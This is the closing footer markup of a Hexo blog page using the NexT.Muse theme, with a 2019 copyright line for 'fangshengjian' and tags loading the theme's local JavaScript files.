        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">fangshengjian</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.3.0</div>

        








        
      </div>
    </footer>
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
      </div>

    

  </div>

  
  <script src="/lib/jquery/index.js?v=3.4.1"></script>
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

<script src="/js/utils.js?v=7.3.0"></script>
  <script src="/js/motion.js?v=7.3.0"></script>


  <script src="/js/schemes/muse.js?v=7.3.0"></script>


<script src="/js/next-boot.js?v=7.3.0"></script>




  




























  

  

  


  
  <script src="/js/scrollspy.js?v=7.3.0"></script>
<script src="/js/post-details.js?v=7.3.0"></script>


</body>
</html>
